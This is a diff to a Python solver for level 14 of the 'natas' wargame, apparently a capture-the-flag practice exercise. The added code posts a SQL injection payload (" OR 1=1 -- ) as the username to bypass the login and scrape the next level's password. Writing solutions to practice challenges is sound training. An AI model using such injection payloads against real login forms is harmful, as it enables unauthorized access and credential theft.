@@ -1,4 +1,5 @@
 """
+natas14: SQL injection, no input sanitization
 """
 
 import requests
@@ -9,7 +10,15 @@ from natas_utils import *
 LEVEL = 14
 
 def solve(url: str, login: LevelLogin) -> Optional[str]:
-    return None
+    payload = f'" OR 1=1 -- '
+    form_data = {
+        "username": payload,
+        "password": "",
+    }
+    response = requests.post(url, auth=login, data=form_data)
+    # print(response.text)
+
+    return try_level_login(LEVEL + 1, extract_candidate_passwords(response.text))
 
 if __name__ == "__main__":
     url, login = load_level(LEVEL)
